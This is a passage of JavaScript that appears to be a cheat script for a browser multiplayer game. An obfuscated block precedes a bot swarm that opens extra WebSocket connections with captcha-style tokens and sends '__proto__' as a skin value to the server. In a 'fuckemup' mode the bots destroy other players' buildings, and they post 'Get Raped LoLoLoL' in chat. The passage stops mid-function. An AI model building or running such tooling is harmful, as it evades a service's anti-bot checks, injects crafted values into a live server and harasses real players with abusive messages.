x3e\x4f\x7cҒ\x52ߌ\x6a\x48\x3f\x34\x5a\x7a\x32\x63\x6f˼\x2c\x78י\x68\x2b\x44\x3e\x3a\x70\x63\x34\x69\x3d\x71\x25\x53Ǝ٘\x5f\x53\x55ڃۏ\x65\x29\x64\x40\x54\x33\x35\x74ɡ\x70ڛܤ\x7c\x24\x78\x58\x54\x3d\x6e\x30\x7a\x5dƮ\x36\x55Ы\x6e\x6a\x76Ʋ\x72\x2fڙ\x3bĶȋ\x25\x64\x6b\x73\x5bđ\x35\x51\x2bʒ\x5fˇ\x79\x4e\x37\x72\x2cķ\x7bС\x65˱\x2b\x5a\x50\x37\x54\x62\x3c\x7d\x31\x39\x31\x40Ħ\x4b\x28\x49\x3d՟\x36\x5eǍ\x73\x51\x2e\x2fϳ\x6c\x78܊\x56\x6d\x46\x6c\x7a'}if(VUT2s4(0x1a9)in zPV4te[zPV4te[VUT2s4(0x1a7)]-VUT2s4(0xff)]){zPV4te[VUT2s4(0x177)]+='\u0078\u0067\u0036\u0074Օ\u002c\u007c\u0052\u0021̃؝\u0059ࢉ\u002aӀ\u0072\u004bࠢŠ\u0069\u004f\u002b\u0049\u0064\u004b\u007b\u0044՗\u0054\u0029\u0031ݖ\u0037\u0055\u006aם\u004e\u0045\u007b\u0060\u0037\u006f\u002f\u0044\u003a\u007aܞ\u0036Ɨ\u002b\u0045\u0060\u005e\u004b\u003f\u005f\u005f\u006c\u0044މ˚\u0040ѫՊ࡚\u0043\u006f\u0079\u0072\u004dϳ\u0045ͭ\u0054\u002cЊ\u0068ۘ\u003b\u0070؋\u003fߗ\u0040\u0068\u0067\u0042\u0046\u0074\u0022ܾ\u0068ϥ\u004f\u006b\u005e֖\u004b\u0048\u0030\u0053\u0035\u0021\u004fߋ\u002c\u0023\u0058ࡹ࠸Ȳ\u0028\u0043\u0033Ǒη\u0072\u006f\u0060\u002c\u007a\u0040\u0035\u0025˽\u007dɜ\u0069\u0061\u007e\u0030\u0037\u005b֤ʺࠩޓ\u006dऊ\u0077\u0070\u0054\u0064\u0057\u0053\u0063\u006bɹ\u0065\u003b\u0021\u0037\u004eɕ\u003c\u007a\u0033\u0044ƭ\u0030\u007b֕\u005b\u006d˔ݜ\u007b\u007b\u0071\u0070\u0078\u003a\u0044\u0040ź\u0024\u0054ل\u0032\u004dŮ\u002a\u006a\u0033\u0069\u002b\u0065\u0065\u0078ީح\u005bȧɊ\u005a\u002f\u0038\u0068Ϫ\u0024\u0058\u007e\u007a\u0062Ė\u0030Ɓ\u0079\u002c\u0071\u0052\u0031ݻ\u003dࢢ\u0074\u0064\u006f\u006fࠧٿ\u0039ǽ\u004c\u0055\u0079\u006d\u0055\u003bƀ\u004d\u0037\u005e\u002f\u005a\u0054\u0071\u0068\u0079\u0069\u0077\u0040̨\u002a\u007aݻ։\u0037\u0022\u0052\u007b\u0032ݢɳ\u002a\u002c\u0068\u0054\u0041\u0031\u0024\u0037\u005d\u002a\u0069\u005fΛࡔ\u0031\u0065\u0025\u0060\u0067޸\u0052Ϯȡ\u004b\u0073\u0034\u003d\u0029\u005eܷঊ\u0043\u005e\u005aل\u002b\u0053Ħͩ\u006d\u0037\u0038\u005a\u003e\u004b\u004f͉࣊\u0055\u0073\u0060ɣ\u0075\u006e\u0064\u0065\u0066\u0069\u006e\u0065\u0064\u007c\u0072ʄ֘\u006e\u0020\u0074Ӷş\u0070\u0075ğҕ\u005f\u0070ࣼ؟ࢿ̀Ŀ\u0073\u0074\u0072\u0075\u0063؟\u0072\u007c\u006e\u0061Ⱥū\u0065\u006e\u0067৉ԡृ\u0074\u0044\u0065ࠒ়ঢ়ג\u006e\u0074\u0038\u0041\u0072\u0072\u0061\u0079\u007cȭ\u0066\u0066\u0065ঢ়\u0053৘ি\u0067Ľ৴৶\u007c\u0066ࣼ\u006dࣉ়\u0050\u006fিǉਆ߿\u0043\u0068\u0061\u0072ਉǽ\u006a਌\u006eĸ৫\u006f়ਅਇ\u007c؟৾\u0072਀Π\u0074\u0066\u002d\u0038ҕ\u0033ʂ\u0035\u0059\u007cϐ\u0071κ\u007aĸ\u005f\u0076\u0043ׯ̀\u0061\u006cć\u006b\u0053\u0030\u0051۳Ū\u0061\u0070\u0070\u006c৷\u0048\u0062Ό\u0034߯ޑ\u0037\u0063\u0067ŋ\u0079\u006c\u005a\u0031\u0070\u0076ǲ\u0078\u004d\u0046\u004cתϾ\u005a࢟\u0061ŪˋФ\u0068ŋ\u004e\u0048\u0064'}if('\x51\x74\x72\x56\x6a\x4b\x75\x73\x39'in zPV4te[zPV4te[VUT2s4(0x1a7)]-VUT2s4(0xff)]){zPV4te[zPV4te.vXfvYv+(zPV4te[VUT2s4(0x1a7)]-0x73)]+='\x76\x41\x38'}if(VUT2s4(0x1aa)in zPV4te[zPV4te[VUT2s4(0x1a7)]-VUT2s4(0xff)]){zPV4te[VUT2s4(0x177)]+='\x73Ǯ\x31'}return zPV4te[VUT2s4(0x1a7)]>VUT2s4(0x195)?zPV4te[VUT2s4(0xe5)]:zPV4te[VUT2s4(0x177)]}WfgY8I(aUFcZqZ,VUT2s4(0x6c));function aUFcZqZ(...zPV4te){uGAa39(zPV4te[VUT2s4(0x5a)]=VUT2s4(0x6c),zPV4te[0xd7]=zPV4te[VUT2s4(0x70)]);return ry8N2BZ[zPV4te[VUT2s4(0x1ab)]]}function MBRpLjC(uGAa39){var zPV4te,Imh86ks,QzG8ub,ry8N2BZ={},Tl85W6m=uGAa39.split(''),rLqAuyh=Imh86ks=Tl85W6m[VUT2s4(0x70)],VqSuJl=[rLqAuyh],fnXXAUr=zPV4te=0x100;for(uGAa39=VUT2s4(0x6c);uGAa39<Tl85W6m.length;uGAa39++)QzG8ub=Tl85W6m[uGAa39].charCodeAt(0x0),QzG8ub=fnXXAUr>QzG8ub?Tl85W6m[uGAa39]:ry8N2BZ[QzG8ub]?ry8N2BZ[QzG8ub]:Imh86ks+rLqAuyh,VqSuJl.push(QzG8ub),rLqAuyh=QzG8ub.charAt(VUT2s4(0x70)),ry8N2BZ[zPV4te]=Imh86ks+rLqAuyh,zPV4te++,Imh86ks=QzG8ub;return VqSuJl.join('').split('\x7c')}function eQ4mrb(){return['\u006c\u0065\u006e\u0067\u0074\u0068','\x45\x45\x75\x68\x4e\x4a',0x2,0x21,0x25,0x1b,0x1c,0x2b,0x32,'\u0056\u007e\u007c\u007e\u0044',0x71,'\x63\x59\x39\x66\x36\x66\x32',0x3,0x4,0x78,0x41,0x84,0x43,0x1,0x44,0x45,0x82,0x0,0x5,0xd0,0x80,0x3d,0xd6,0x7f,0xf,0xc,0x6,0x3f,0xdc,0x7,0xd2,0xdf,0x14,0x12,0xe,0x52,0x88,0x55,0x40,0xc8,void 0x0,0x42,0xd4,0x20,'\x4c\x71\x38\x71\x49\x6b\x6d',0x54,'\x62\x47\x46\x50\x5a\x59',0x10,0x4e,0x1a,0x86,0xc3,'\u0062\u0048\u0074\u0072\u0078\u0041\u0079',0x9,0x8b,0x31,0x5b,0x33,0x58,0xd,0x30,0x8,0xff,0x34,'\x69\x79\x79\x74\x6e\x6e',0xcf,0x5e,0xb8,0x60,'\u0042\u0077\u0057\u0048\u005a\u004f','\x66\x61\x59\x37\x66\x42\x61',0xe5,0x6b,0x11,'\u0063\u0075\u0059\u0051\u0037\u0063',0xb,'\u0072\u0032\u0061\u0076\u0031\u0059\u0072','\x5f\x64\x34\x37\x51\x4b',0x3c,0x4b,0x2f,0x2d,0xcc,'\x59\x33\x76\x4e\x74\x49\x31',0x2c,'\x6d\x4c\x74\x76\x32\x6c',0x67,0x27,0xa1,0xa,0xe7,0x23,0xf7,0x2a,0x29,'\x42\x64\x50\x6f\x6a\x62\x4e',0x90,0x92,'\u0058\u006b\u007a\u0056\u0067\u006c\u0065',0x94,'\u006b\u007a\u0035\u0044\u0043\u0047','\x77\x53\x49\x36\x75\x53','\x6c\x46\x73\x73\x79\x38','\u0051\u0034\u0058\u0048\u0042\u0047\u006f','\u006b\u0078\u0068\u007a\u0036\u0076',0x1fff,0x9d,0x95,0x13,0xdd,'\u0070\u006c\u0076\u0065\u006f\u0078',0xe3,null,0x16,0x17,0x18,0x19,0x89,0xa4,0x1e,'\u0047\u0033\u0070\u0075\u0074\u0042\u0035','\u006e\u0079\u0038\u0075\u0064\u0042\u0041',0xda,0x1f,0x24,0x1fb,0x6c,0x50,0x4a,0x26,0xe9,0x91,'\x69','\u0075',0x37,!0x1,'\u006f',0x5f,'\u0065','\x63','\x74\x33\x70\x62\x59\x63\x74',0x105,0x83,0xa5,'\u0062',0x73,0x7d,0x48,'\x71','\u0070','\u0049\u004e\u0051\u004c\u0054\u0043',0x51,'\x4c',0xa3,0x57,'\u006a',0x22,'\u0066','\u0047',0x14e,0x7c,0x77,'\x47\x35\x48\x31\x6d\x59',0xe1,0xf5,'\u0044',0x98,'\u006c','\u0074',0x61,'\x46','\u0041',0x69,'\x64','\u0061\u0064',0x193,'\u0042',0xb4,0x38,0xd9,'\u0061\u0072',0xba,'\u0077','\x58\x30\x76\x4b\x33\x59',0xe6,0x46,'\x64\x5f\x59\x73\x50\x55',0x2e,0x227,'\x55','\u0061\u0063',0xf2,0x242,'\x76',0x75,'\x61','\u0067','\u0046\u0048\u0031\u0063\u007a\u005a','\x51',0xa7,0x7b,0x103,0x76,0xbd,'\x4b',0x4f,0xf4,'\u0050','\u0043','\x4a',0xcb,0xbe,0x367,0x99,'\u006b',0x5d,'\u004d\u0043\u004b\u006d\u006a\u006f','\u0042\u0039\u0038\u0034\u0035\u0065\u006e','\u0067\u0073\u0032\u0075\u0071\u0068','\x76\x62\x49\x6b\x31\x4d\x36','\u0074\u0046\u0049\u0068\u0062\u0065\u005a','\u0070\u0049\u0076\u0041\u0067\u0053\u004e','\x49\x4b\x59\x59\x49\x5f',0x3e,0x36,0x35,'\x69\x70',0xe8,0x3a,0xc4,0xd3,0x6a,0x62,0x63,0x66,0x64,0x5a,'\x76\x34\x78\x6b\x42\x58\x44',0xd5,0x59,'\u0068\u0055\u0045\u0052\u0046\u0057\u005f',0xeb,0x4c,0xec,0x56,0x4d,!0x0,0x53,0x68,'\u006e\u0065',0xee,'\x4e\x39\x76\x52\x6b\x6a\x6c',0x70,0x72,'\x52\x56\x69\x42\x55\x6d\x37',0x7a,0x7e,'\u0079\u0064\u0057\u0066\u0075\u0047\u0059','\x74\x39\x78\x4c\x6c\x71','\x68\x58\x32\x6f\x53\x75\x64','\u0068\u0072\u0034\u0072\u006e\u0049','\u006f\u0065\u006a\u0035\u006d\u0033','\x70\x49\x6b\x7a\x6f\x30\x50',0x81,'\u005f\u0037\u0069\u0077\u0057\u0051\u005f','\x41\x4a\x67\x31\x62\x68',0x1b5,0x138,0x3a3,'\u004e\u0034\u0044\u0032\u0036\u0064\u0078','\x47\x6f\x6d\x4f\x4a\x37','\x55\x57\x47\x43\x48\x59','\u006f\u006f\u0067\u0048\u004d\u0033\u006a',0xc7,0x85,'\u0059\u0062\u0046\u0077\u0070\u0032',0xc5,0xb3,0x15,0x1f7,0x87,0x2b1,0x8c,0x8a,0x93,0x377,0x3d2,0x96,0x2a1,0x310,0x37b,0x260,0x9c,0x9f,0xbc,0xa2,0x9e,0xaa,0x8e,'\x6e\x74',0xad,0xae,0xb5,0xaf,0xf1,0xb0,0xb1,'\x6f\x6e',0xb6,0xb2,0xef,0x6d,'\u0066\u006a\u004d\u0032\u007a\u0050',0xb7,0xbb,0x97,0xbf,0xc2,0x393,'\x73\x6b','\x74\x65',0xc9,'\x76\x61\x75\x59\x54\x43\x44','\x74\x55\x30\x36\x38\x5f','\u0074\u0051\u0075\u0058\u0031\u0063\u0075','\u0042\u0072\u0037\u0030\u0034\u004f','\u0042\u0049\u0078\u006b\u0032\u0076\u0059','\u004e\u0069\u0052\u0071\u0052\u0072\u0041','\x76\x58\x66\x76\x59\x76','\x78\x55\x39\x39','\x6b\x5a\x48\x6c\x66\x46\x4a\x74\x4e\x33\x4b\x77','\u0053\u0042\u006b\u0069\u0035\u0051\u0073\u0047\u004c\u006a\u0078',0xd7]}function kb03HM(uGAa39,Imh86ks=0x0){var QzG8ub=function(){return uGAa39(...arguments)};return zPV4te(QzG8ub,'\u006c\u0065\u006e\u0067\u0074\u0068',{'\x76\x61\x6c\x75\x65':Imh86ks,'\x63\x6f\x6e\x66\x69\x67\x75\x72\x61\x62\x6c\x65':true})}
    // BOT:
    let bots = [];
    let ranLocation = {
        x: UTILS.randInt(35, 14365),
        y: UTILS.randInt(35, 14365)
    };
    setInterval(() => {
        ranLocation = {
            x: UTILS.randInt(35, 14365),
            y: UTILS.randInt(35, 14365)
        };
    }, 60000);
    class Bot {
        constructor(id, sid, hats, accessories) {
            this.millPlace = true;
            this.id = id;
            this.sid = sid;
            this.team = null;
            this.skinIndex = 0;
            this.tailIndex = 0;
            this.hitTime = 0;
            this.iconIndex = 0;
            this.enemy = [];
            this.near = [];
            this.dist2 = 0;
            this.aim2 = 0;
            this.tick = 0;
            this.itemCounts = {};
            this.latestSkin = 0;
            this.latestTail = 0;
            this.points = 0;
            this.tails = {};
            for (let i = 0; i < accessories.length; ++i) {
                if (accessories[i].price <= 0)
                    this.tails[accessories[i].id] = 1;
            }
            this.skins = {};
            for (let i = 0; i < hats.length; ++i) {
                if (hats[i].price <= 0)
                    this.skins[hats[i].id] = 1;
            }
            this.spawn = function(moofoll) {
                this.upgraded = 0;
                this.enemy = [];
                this.near = [];
                this.active = true;
                this.alive = true;
                this.lockMove = false;
                this.lockDir = false;
                this.minimapCounter = 0;
                this.chatCountdown = 0;
                this.shameCount = 0;
                this.shameTimer = 0;
                this.sentTo = {};
                this.gathering = 0;
                this.autoGather = 0;
                this.animTime = 0;
                this.animSpeed = 0;
                this.mouseState = 0;
                this.buildIndex = -1;
                this.weaponIndex = 0;
                this.dmgOverTime = {};
                this.noMovTimer = 0;
                this.maxXP = 300;
                this.XP = 0;
                this.age = 1;
                this.kills = 0;
                this.upgrAge = 2;
                this.upgradePoints = 0;
                this.x = 0;
                this.y = 0;
                this.zIndex = 0;
                this.xVel = 0;
                this.yVel = 0;
                this.slowMult = 1;
                this.dir = 0;
                this.nDir = 0;
                this.dirPlus = 0;
                this.targetDir = 0;
                this.targetAngle = 0;
                this.maxHealth = 100;
                this.health = this.maxHealth;
                this.oldHealth = this.maxHealth;
                this.scale = config.playerScale;
                this.speed = config.playerSpeed;
                this.resetMoveDir();
                this.resetResources(moofoll);
                this.items = [0, 3, 6, 10];
                this.weapons = [0];
                this.shootCount = 0;
                this.weaponXP = [];
                this.isBot = false;
                this.reloads = {
                    0: 0,
                    1: 0,
                    2: 0,
                    3: 0,
                    4: 0,
                    5: 0,
                    6: 0,
                    7: 0,
                    8: 0,
                    9: 0,
                    10: 0,
                    11: 0,
                    12: 0,
                    13: 0,
                    14: 0,
                    15: 0,
                    53: 0,
                };
                this.timeZinceZpawn = 0;
                this.whyDie = "";
                this.clearRadius = false;
                this.circlee = 0;
            };

            // RESET MOVE DIR:
            this.resetMoveDir = function() {
                this.moveDir = undefined;
            };

            // RESET RESOURCES:
            this.resetResources = function(moofoll) {
                for (let i = 0; i < config.resourceTypes.length; ++i) {
                    this[config.resourceTypes[i]] = moofoll ? 100 : 0;
                }
            };

            // SET DATA:
            this.setData = function(data) {
                this.id = data[0];
                this.sid = data[1];
                this.name = data[2];
                this.x = data[3];
                this.y = data[4];
                this.dir = data[5];
                this.health = data[6];
                this.maxHealth = data[7];
                this.scale = data[8];
                this.skinColor = data[9];
            };


            // SHAME SYSTEM:
            this.judgeShame = function() {
                if (this.oldHealth < this.health) {
                    if (this.hitTime) {
                        let timeSinceHit = this.tick - this.hitTime;
                        this.hitTime = 0;
                        if (timeSinceHit < 2) {
                            this.lastshamecount = this.shameCount;
                            this.shameCount++;
                        } else {
                            this.lastshamecount = this.shameCount;
                            this.shameCount = Math.max(0, this.shameCount - 2);
                        }
                    }
                } else if (this.oldHealth > this.health) {
                    this.hitTime = this.tick;
                }
            };

            // CHECK TEAM
            this.isTeam = function (tmpObj) {
                return (this == tmpObj || (this.team && this.team == tmpObj.team));

            };
            // UPDATE WEAPON RELOAD:
            this.manageReloadaa = function() {
                if (this.shooting[53]) {
                    this.shooting[53] = 0;
                    this.reloads[53] = (2500 - 1000/9);
                } else {
                    if (this.reloads[53] > 0) {
                        this.reloads[53] = Math.max(0, this.reloads[53] - 1000/9);
                    }
                }
                if (this.gathering || this.shooting[1]) {
                    if (this.gathering) {
                        this.gathering = 0;
                        this.reloads[this.gatherIndex] = (items.weapons[this.gatherIndex].speed * (this.skinIndex == 20 ? 0.78 : 1));
                        this.attacked = true;
                    }
                    if (this.shooting[1]) {
                        this.shooting[1] = 0;
                        this.reloads[this.shootIndex] = (items.weapons[this.shootIndex].speed * (this.skinIndex == 20 ? 0.78 : 1));
                        this.attacked = true;
                    }
                } else {
                    this.attacked = false;
                    if (this.buildIndex < 0) {
                        if (this.reloads[this.weaponIndex] > 0) {
                            this.reloads[this.weaponIndex] = Math.max(0, this.reloads[this.weaponIndex] - game.tickRate);
                        }
                    }
                }
            };

            this.closeSockets = function(websc) {
                websc.close();
            };

            this.whyDieChat = function(websc, whydie) {
                websc.sendWS("6", whydie + " Get Raped LoLoLoL");
            };
        }
    };

    class BotObject {
        constructor(sid) {
            this.sid = sid;
            // INIT:
            this.init = function(x, y, dir, scale, type, data, owner) {
                data = data || {};
                this.active = true;
                this.x = x;
                this.y = y;
                this.scale = scale;
                this.owner = owner;
                this.id = data.id;
                this.dmg = data.dmg;
                this.trap = data.trap;
                this.teleport = data.teleport;
                this.isItem = this.id != undefined;
            };

        }
    };
    class BotObjManager {
        constructor(botObj, fOS) {
            // DISABLE OBJ:
            this.disableObj = function(obj) {
                obj.active = false;
                if (config.anotherVisual) {} else {
                    obj.alive = false;
                }
            };

            // ADD NEW:
            let tmpObj;
            this.add = function(sid, x, y, dir, s, type, data, setSID, owner) {
                tmpObj = fOS(sid);
                if (!tmpObj) {
                    tmpObj = botObj.find((tmp) => !tmp.active);
                    if (!tmpObj) {
                        tmpObj = new BotObject(sid);
                        botObj.push(tmpObj);
                    }
                }
                if (setSID) {
                    tmpObj.sid = sid;
                }
                tmpObj.init(x, y, dir, s, type, data, owner);
            };

            // DISABLE BY SID:
            this.disableBySid = function(sid) {
                let find = fOS(sid);
                if (find) {
                    this.disableObj(find);
                }
            };

            // REMOVE ALL FROM PLAYER:
            this.removeAllItems = function(sid, server) {
                botObj.filter((tmp) => tmp.active && tmp.owner && tmp.owner.sid == sid).forEach((tmp) => this.disableObj(tmp));
            };
        }
    };

    let botz = [];

    function botSpawn(id) {
        let bot;
        console.log(WS);
        let t = WS.url.split("wss://")[1].split("?")[0];
        // `id` is already a full "cf:<token>" string from EXP.freshToken();
        // the server stopped accepting the "re:" reCAPTCHA prefix.
        bot = id && new WebSocket("wss://" + t + "?token=" + encodeURIComponent(id));
        let botPlayer = new Map();
        botSkts.push([botPlayer]);
        botz.push([bot]);
        let botSID;
        let botObj = [];
        let nearObj = [];
        let bD = {
            x: 0,
            y: 0,
            inGame: false,
            closeSocket: false,
            whyDie: ""
        };
        let oldXY = {
            x: 0,
            y: 0,
        };
        let izauto = 0;
        let botObjManager = new BotObjManager(botObj, function(sid) { return findSID(botObj, sid); });
        bot.binaryType = "arraybuffer";
        bot.first = true;
        bot.sendWS = function(type) {
            // EXTRACT DATA ARRAY:
            let data = Array.prototype.slice.call(arguments, 1);
            // Framed with this bot's own key, tables and sequence, taken from
            // the bot socket's own io-init.
            EXP.send(bot, type, data);
        };
        bot.spawn = function() {
            bot.sendWS("M", {
                name: "Trash Slave",
                moofoll: 1,
                skin: "__proto__"
            });
        };
        bot.sendUpgrade = function(index) {
            bot.sendWS("H", index);
        };
        bot.place = function(id, a) {
            try {
                let item = items.list[botPlayer.items[id]];
                if (botPlayer.itemCounts[item.group.id] == undefined ? true : botPlayer.itemCounts[item.group.id] < (config.isSandbox ? 296 : item.group.limit ? item.group.limit : 296)) {
                    bot.sendWS("z", botPlayer.items[id]);
                    bot.sendWS("F", 1, a);
                    bot.sendWS("z", botPlayer.weaponIndex, true);
                }
            } catch (e) {
            }
        };
        bot.buye = function(id, index) {
            let nID = 0;
            if (botPlayer.alive && botPlayer.inGame) {
                if (index == 0) {
                    if (botPlayer.skins[id]) {
                        if (botPlayer.latestSkin != id) {
                            bot.sendWS("c", 0, id, 0);
                        }
                    } else {
                        let find = findID(hats, id);
                        if (find) {
                            if (botPlayer.points >= find.price) {
                                bot.sendWS("c", 1, id, 0);
                                bot.sendWS("c", 0, id, 0);
                            } else {
                                if (botPlayer.latestSkin != nID) {
                                    bot.sendWS("c", 0, nID, 0);
                                }
                            }
                        } else {
                            if (botPlayer.latestSkin != nID) {
                                bot.sendWS("c", 0, nID, 0);
                            }
                        }
                    }
                } else if (index == 1) {
                    if (botPlayer.tails[id]) {
                        if (botPlayer.latestTail != id) {
                            bot.sendWS("c", 0, id, 1);
                        }
                    } else {
                        let find = findID(accessories, id);
                        if (find) {
                            if (botPlayer.points >= find.price) {
                                bot.sendWS("c", 1, id, 1);
                                bot.sendWS("c", 0, id, 1);
                            } else {
                                if (botPlayer.latestTail != 0) {
                                    bot.sendWS("c", 0, 0, 1);
                                }
                            }
                        } else {
                            if (botPlayer.latestTail != 0) {
                                bot.sendWS("c", 0, 0, 1);
                            }
                        }
                    }
                }
            }
        };
        bot.fastGear = function() {
            if (botPlayer.y2 >= config.mapScale / 2 - config.riverWidth / 2 && botPlayer.y2 <= config.mapScale / 2 + config.riverWidth / 2) {
                bot.buye(31, 0);
            } else {
                if (botPlayer.y2 <= config.snowBiomeTop) {
                    bot.buye(15, 0);
                } else {
                    bot.buye(12, 0);
                }
            }
        };
        bot.selectWeapon = function(a) {
            packet("z", a, 1);
        }
        function caf(e, t) {
            try {
                return Math.atan2((t.y2 || t.y) - (e.y2 || e.y), (t.x2 || t.x) - (e.x2 || e.x));
            } catch (e) {
                return 0;
            }
        }
        bot.heal = function() {
            if (botPlayer.health < 100) {
                bot.place(0, 0)
            }
        }
        function cdf (e, t){
            try {
                return Math.hypot((t.y2||t.y)-(e.y2||e.y), (t.x2||t.x)-(e.x2||e.x));
            } catch(e){
                return Infinity;
            }
        }
        let zoon = 'no';
        bot.zync = function(a) {
            if (!botPlayer.millPlace) {
                zoon = 'yeah';
                bot.place(5, caf(botPlayer, a));
                let NextTickLocation = {
                    x: botPlayer.x + Math.cos(caf(a, botPlayer) - Math.PI) * 80,
                    y: botPlayer.y + Math.sin(caf(a, botPlayer) - Math.PI) * 80,
                    x2: botPlayer.x + Math.cos(caf(a, botPlayer) - Math.PI) * 80,
                    y2: botPlayer.y + Math.sin(caf(a, botPlayer) - Math.PI) * 80,
                };

                function calculateDistance(x1, y1, x2, y2) {
                    let distance = Math.sqrt(Math.pow((x2 - x1), 2) + Math.pow((y2 - y1), 2));
                    return distance;
                }
                function dotherezt() {
                    bot.sendWS("6", calculateDistance(NextTickLocation.x, NextTickLocation.y, botPlayer.x, botPlayer.y)+'');
                    bot.sendWS("D", caf(a, botPlayer) - Math.PI);
                }

                let aa = setInterval(() => {
                    bot.sendWS("z", botPlayer.weapons[1], true);
                    if (izauto == 0) {
                        bot.sendWS("K", 1);
                        izauto = 1;
                    }
                    setTimeout(() => {
                        bot.sendWS("z", botPlayer.weapons[0], true);
                    }, 2000);
                    bot.buye(53, 0);
                    if (calculateDistance(NextTickLocation.x, NextTickLocation.y, botPlayer.x, botPlayer.y) > 5) {
                        bot.sendWS("f", caf(botPlayer, NextTickLocation));
                    } else {
                        bot.sendWS("6", calculateDistance(NextTickLocation.x, NextTickLocation.y, botPlayer.x, botPlayer.y)+'');
                        zoon = 'no';
                        bot.sendWS("f", undefined);
                        dotherezt();
                        clearInterval(aa);
                    }
                }, 150);

                setTimeout(() => {
                    zoon = 'no';
                    clearInterval(aa);
                }, 500);
            }
        };
        bot.onmessage = function(message) {
            let parsed = EXP.receive(bot, message.data);
            if (!parsed) return;
            let type = parsed.type;
            let data = parsed.args;
            if (type == "io-init") {
                bot.spawn();
            }
            // setupGame. This branch said "1", the name it carried in the 2019
            // protocol; the current server calls it "C".
            if (type == "C") {
                botSID = data[0];
                console.log(botSID)
            }
            if (type == "D") {
                if (data[1]) {
                    botPlayer = new Bot(data[0][0], data[0][1], hats, accessories);
                    botPlayer.setData(data[0]);
                    botPlayer.inGame = true;
                    botPlayer.alive = true;
                    botPlayer.x2 = undefined;
                    botPlayer.y2 = undefined;
                    botPlayer.spawn(1);
                    botPlayer.oldHealth = 100;
                    botPlayer.health = 100;
                    botPlayer.showName = 'YEAHHH';
                    oldXY = {
                        x: data[0][3],
                        y: data[0][4]
                    }
                    bD.inGame = true;
                    if (bot.first) {
                        bot.first = false;
                        bots.push(bD);
                    }
                }
            }
            if (type == "P") {
                bot.spawn();
                botPlayer.inGame = false;
                bD.inGame = false;
            }
            // updatePlayers, the flat player-field array. Called "f" in the
            // build this was written against; the current server calls it "a".
            if (type == "a") {
                let tmpData = data[0];
                botPlayer.tick++;
                botPlayer.enemy = [];
                botPlayer.near = [];
                bot.showName = 'YEAHHH';
                nearObj = [];
                for (let i = 0; i < tmpData.length;) {
                    if (tmpData[i] == botPlayer.sid) {
                        botPlayer.x2 = tmpData[i + 1];
                        botPlayer.y2 = tmpData[i + 2];
                        botPlayer.d2 = tmpData[i + 3];
                        botPlayer.buildIndex = tmpData[i + 4];
                        botPlayer.weaponIndex = tmpData[i + 5];
                        botPlayer.weaponVariant = tmpData[i + 6];
                        botPlayer.team = tmpData[i + 7];
                        botPlayer.isLeader = tmpData[i + 8];
                        botPlayer.skinIndex = tmpData[i + 9];
                        botPlayer.tailIndex = tmpData[i + 10];
                        botPlayer.iconIndex = tmpData[i + 11];
                        botPlayer.zIndex = tmpData[i + 12];
                        botPlayer.visible = true;
                        bD.x2 = botPlayer.x2;
                        bD.y2 = botPlayer.y2;
                    }
                    i += 13;
                }

                for (let i = 0; i < tmpData.length;) {
                    tmpObj = findPlayerBySID(tmpData[i]);
                    if (tmpObj) {
                        if (!tmpObj.isTeam(botPlayer)) {
                            enemy.push(tmpObj);
                            if (tmpObj.dist2 <= items.weapons[tmpObj.primaryIndex == undefined ? 5 : tmpObj.primaryIndex].range + (botPlayer.scale * 2)) {
                                nears.push(tmpObj);
                            }
                        }
                    }
                    i += 13;
                }

                if (enemy.length) {
                    //console.log(enemy)
                    botPlayer.near = enemy.sort(function(tmp1, tmp2) {
                        return tmp1.dist2 - tmp2.dist2;
                    })[0];
                }

                if (izauto == 1) {
                    bot.sendWS("K", 1);
                    izauto = 0;
                }

                if (bD.closeSocket) {
                    botPlayer.closeSockets(bot);
                }
                if (bD.whyDie != "") {
                    botPlayer.whyDieChat(bot, bD.whyDie);
                    bD.whyDie = "";
                }
                if (botPlayer.alive) {
                    if (player.team) {
                        if (botPlayer.team != player.team && (botPlayer.tick % 9 === 0)) {
                            botPlayer.team && (bot.sendWS("N"));
                            bot.sendWS("b", player.team);
                        }
                    }

                    let item = items.list[botPlayer.items[3]];
                    let a = botPlayer.itemCounts[item.group.id]
                    if ((a != undefined ? a : 0) < 201 && botPlayer.millPlace) {
                        if (botPlayer.inGame) {
                            bot.sendWS("D", botPlayer.moveDir);
                            if (izauto == 0) {
                                bot.sendWS("K", 1);
                                izauto = 1;
                            }
                            if (UTILS.getDist(oldXY, botPlayer, 0, 2) > 90) {
                                let aim = UTILS.getDirect(oldXY, botPlayer, 0, 2);
                                bot.place(3, aim + 7.7);
                                bot.place(3, aim - 7.7);
                                bot.place(3, aim);
                                oldXY = {
                                    x: botPlayer.x2,
                                    y: botPlayer.y2
                                };
                            }

                            if (botPlayer.tick % 90 === 0) {
                                let rand = Math.random() * Math.PI * 2;
                                botPlayer.moveDir = rand;
                                bot.sendWS("f", botPlayer.moveDir);
                            }
                        }
                        bot.fastGear();
                    } else if((a != undefined ? a : 0) > 296 && botPlayer.millPlace) {
                        botPlayer.millPlace = false;
                        // bot.sendWS("K", 1);
                        bot.fastGear();
                    } else {
                        if (botPlayer.inGame) {
                            if (botObj.length > 0) {
                                let buldingtoawdoin = botObj.filter((e) => e.active && e.isItem && UTILS.getDist(e, player, 0, 2) <= (600));
                                if (getEl("mode").value == 'fuckemup') {
                                    // if (getEl("mode").value == "clear") {
                                    bot.selectWeapon(botPlayer.weapons[1]);
                                    let gotoDist = UTILS.getDist(buldingtoawdoin[0], botPlayer, 0, 2);
                                    let gotoAim = UTILS.getDirect(buldingtoawdoin[0], botPlayer, 0, 2);
                                    nearObj = botObj.filter((e) => e.active && (findSID(buldingtoawdoin, e.sid) ? true : !(e.trap && (player.sid == e.owner.sid || player.findAllianceBySid(e.owner.sid)))) && e.isItem && UTILS.getDist(e, botPlayer, 0, 2) <= (items.weapons[botPlayer.weaponIndex].range + e.scale + 10)).sort(function(a, b) {
                                        return UTILS.getDist(a, botPlayer, 0, 2) - UTILS.getDist(b, botPlayer, 0, 2);
                                    })[0];
                                    if (nearObj) {
                                        let isPassed = UTILS.getDist(buldingtoawdoin[0], nearObj, 0, 0);
                                        if ((gotoDist - isPassed) > 0) {
                                            if (findSID(buldingtoawdoin, nearObj.sid) ? true : (nearObj.dmg || nearObj.trap)) {
                                                if (botPlayer.moveDir != undefined) {
                                                    botPlayer.moveDir = undefined;
                                                    bot.sendWS("f", botPlayer.moveDir);
                                                    bot.sendWS("D", botPlayer.nDir);
                                                }
                                            } else {
                                                botPlayer.moveDir = gotoAim;
                                                bot.sendWS("f", botPlayer.moveDir);
                                                bot.sendWS("D", botPlayer.nDir);
                                            }
                                            if (botPlayer.nDir != UTILS.getDirect(nearObj, botPlayer, 0, 2)) {
